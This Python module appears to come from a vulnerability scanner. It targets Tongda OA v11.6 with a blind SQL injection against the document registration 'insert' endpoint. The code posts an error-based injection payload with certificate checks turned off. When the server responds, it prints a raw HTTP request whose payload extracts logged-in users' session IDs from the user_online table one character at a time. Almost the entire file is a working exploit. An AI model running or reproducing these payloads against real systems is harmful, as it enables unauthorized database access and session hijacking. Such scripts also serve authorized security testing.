import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_6_insert_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data='''title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER='''
    exp_url=urldata+'general/document/index.php/recv/register/insert'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 302:
            print(Vcolors.RED + "[+] 可能存在POST_sql注入漏洞"+Vcolors.ENDC)
            print(Vcolors.RED + ''' [SUCCESS]  使用数据包做进一步验证:
                       POST /general/document/index.php/recv/register/insert HTTP/1.1
                       Host: {}   #ip地址
                       User-Agent: Go-http-client/1.1
                       Content-Length: 122
                       Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
                       Accept-Encoding: gzip
                       
                       title)values("'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),8,1))<66,1,710)))# =1&_SERVER=
                       ''' + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA v11.6 insert SQL注入漏洞" +Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_6_insert_sql脚本出现异常")


